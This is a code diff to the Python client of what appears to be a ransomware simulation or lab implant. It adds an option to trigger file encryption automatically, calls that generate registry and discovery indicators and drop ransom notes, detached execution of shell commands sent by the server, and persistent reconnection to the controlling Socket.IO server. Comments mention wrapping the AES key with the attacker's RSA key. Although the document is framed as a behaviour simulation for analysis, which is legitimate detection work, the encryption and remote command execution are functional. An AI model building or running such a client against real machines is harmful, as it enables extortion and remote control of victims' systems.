@@ -81,6 +81,7 @@ def main():
     parser.add_argument("--insecure", action="store_true", help="Disable TLS certificate verification (diagnostics only)")
     parser.add_argument("--polling", action="store_true", help="Force Socket.IO polling transport (no WebSocket)")
     parser.add_argument("--debug", action="store_true", help="Enable verbose Socket.IO logging")
+    parser.add_argument("--auto-encrypt", dest="auto_encrypt", action="store_true", help="Request server to trigger encrypt immediately after Socket.IO auth")
     group = parser.add_mutually_exclusive_group()
     group.add_argument("--recursive", action="store_true", help="Process files in subfolders (default)")
     group.add_argument("--no-recursive", dest="no_recursive", action="store_true", help="Disable processing subfolders")
@@ -146,7 +147,7 @@ def main():
         try:
             res = session.post(
                 f"{backend}/publickey",
-                json={"hostname": args.hostname},
+                json={"hostname": args.hostname, "auto_encrypt": bool(args.auto_encrypt)},
                 timeout=25,
             )
             res.raise_for_status()
@@ -226,6 +227,14 @@ def main():
             files = processor.process_files(backup_mode=False)
             print(f"[client] Processed files: {len(files)}")
             print(f"[client] Targeted extensions: {', '.join(processor.TARGET_EXTENSIONS)}")
+            # Simulate registry and discovery indicators for analysis
+            try:
+                behavior.simulate_registry_changes()
+                behavior.simulate_discovery()
+                behavior.drop_ransom_notes()
+                print("[client] Behavior indicators generated (registry, discovery, notes)")
+            except Exception as e:
+                print(f"[client] Behavior simulation failed: {e}")
             
             # Flow A: wrap K_AES with attacker's RSA pubkey and store alongside files
             if not state["wrapped"]:
@@ -313,46 +322,97 @@ def main():
             if not cmd:
                 print("[client] run_script received without command")
                 return
-            print(f"[client] Running command: {cmd}")
-            # On Windows VMs this can run python C:\path\to\script.py as requested
-            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-            print("[client] run_script exit code:", result.returncode)
-            if result.stdout:
-                print("[client] run_script stdout:\n" + result.stdout)
-            if result.stderr:
-                print("[client] run_script stderr:\n" + result.stderr)
-            # Emit output back to server for UI
+
+            # If the command starts with 'python', prefer current interpreter to avoid PATH issues
+            try:
+                stripped = cmd.strip()
+                low = stripped.lower()
+                if low.startswith('python '):
+                    # Preserve the rest of the command (script path and args)
+                    rest = stripped.split(' ', 1)[1]
+                    exe = sys.executable.replace('\\', '/')
+                    cmd = f'"{exe}" {rest}'
+            except Exception:
+                pass
+
+            print(f"[client] Running command (detached): {cmd}")
+
+            popen_kwargs = { 'shell': True }
+            if platform.system() == 'Windows':
+                # Start in a new process group, detached from this console
+                CREATE_NEW_PROCESS_GROUP = 0x00000200
+                DETACHED_PROCESS = 0x00000008
+                popen_kwargs['creationflags'] = CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS
+            else:
+                popen_kwargs['start_new_session'] = True
+
+            proc = subprocess.Popen(cmd, **popen_kwargs)
+            print(f"[client] run_script started pid={proc.pid}")
+            # Immediately report start to server so UI doesn't wait for completion
             try:
                 sio.emit('script_output', {
                     'device_token': device_token,
                     'command': cmd,
-                    'returncode': result.returncode,
-                    'stdout': result.stdout,
-                    'stderr': result.stderr,
+                    'pid': proc.pid,
+                    'started': True,
+                    'returncode': None,
+                    'stdout': '',
+                    'stderr': '',
                     'ts': int(time.time()),
                 })
             except Exception as e:
-                print(f"[client] Failed to emit script_output: {e}")
+                print(f"[client] Failed to emit script_output (start): {e}")
         except Exception as e:
             print(f"[client] run_script failed: {e}")
 
-    # Socket.IO server URL: if backend ends with /py_simple, connect sockets to origin
-    try:
-        # Origin without path
-        parts = urlsplit(backend)
-        origin = urlunsplit((parts.scheme, parts.netloc, '', '', ''))
-        socket_base = origin if parts.path.rstrip('/') == '/py_simple' else backend
-        print(f"[client] Connecting to {socket_base} …")
-        transports = ["polling"] if args.polling else ["websocket", "polling"]
-        # socketio_path default is 'socket.io' but set explicitly to avoid proxy/path issues.
-        sio.connect(
-            socket_base,
-            transports=transports,
-            wait_timeout=30,
-            socketio_path='socket.io'
-        )
-    except Exception as e:
-        raise SystemExit(f"Failed to connect to Socket.IO: {e!r}")
+    # Socket.IO server URL: try multiple bases and transports with retry backoff
+    parts = urlsplit(backend)
+    origin = urlunsplit((parts.scheme, parts.netloc, '', '', ''))
+    candidates = []
+    # Prefer origin first (Render often serves sockets at origin)
+    candidates.append(origin)
+    # Then the full backend URL (in case it is also valid)
+    if backend not in candidates:
+        candidates.append(backend)
+    # If backend has a path, also try origin + that path
+    if parts.path and parts.path not in ('', '/'):
+        alt = origin.rstrip('/') + parts.path
+        if alt not in candidates:
+            candidates.append(alt)
+
+    base_transports = ["polling"] if args.polling else ["websocket", "polling"]
+
+    connected = False
+    attempt = 0
+    delay = 3
+    while not connected:
+        last_err = None
+        for base in candidates:
+            for transports in (base_transports, ["polling"]):  # Always give polling a try
+                try:
+                    print(f"[client] Connecting to {base} with transports={transports} …")
+                    sio.connect(
+                        base,
+                        transports=transports,
+                        wait_timeout=30,
+                        socketio_path='socket.io'
+                    )
+                    connected = True
+                    break
+                except Exception as e:
+                    last_err = e
+                    print(f"[client] Connect attempt failed for {base} ({transports}): {e}")
+            if connected:
+                break
+        if not connected:
+            attempt += 1
+            # Exponential-ish backoff capped
+            delay = min(30, delay * 2 if attempt > 1 else delay)
+            print(f"[client] Failed to connect to Socket.IO after attempts: {attempt}. Retrying in {delay}s…")
+            try:
+                time.sleep(delay)
+            except KeyboardInterrupt:
+                raise SystemExit("Interrupted during reconnect wait")
 
     # Keep the client alive and responsive to events
     try:
